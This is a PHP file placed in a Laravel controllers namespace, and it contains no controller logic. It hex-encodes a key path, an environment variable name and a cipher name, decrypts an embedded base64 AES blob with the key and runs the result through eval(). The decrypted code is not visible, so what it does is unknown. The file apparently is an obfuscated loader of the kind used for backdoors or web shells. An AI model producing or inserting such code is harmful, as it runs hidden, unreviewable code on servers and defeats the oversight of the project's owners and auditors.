<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('q4jMJI/gzBEwm8JpmHQiZw==');

$c=base64_decode(

'hdJw4su8JxQA/mNgJMwMWYS8bfpIdYaDZXoW8F96YZsVW/MFr6JBJFXhH/PN71hivp7xYa+TF2pL' .
'j4UTsTcNdQl6tu8izAF9wUrSdoAA4af8OMMkRR0I6FBaYujn5/EpAUGv5v19KtjwoxzCR/ePpUhD' .
'KED2ql98N2p9YqUdkuTuLh9EER28AQ6dvzfqpUW1Vcdp1u+YennArZ2qQJZrCjVHj6RdvYMhcyRb' .
'bNb0deu1SEKTNBdwGE0X5SkbTLk5A693wZWi+kRIfIZw0k/T1lstXRAaGdkupWqhEMTEstY='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

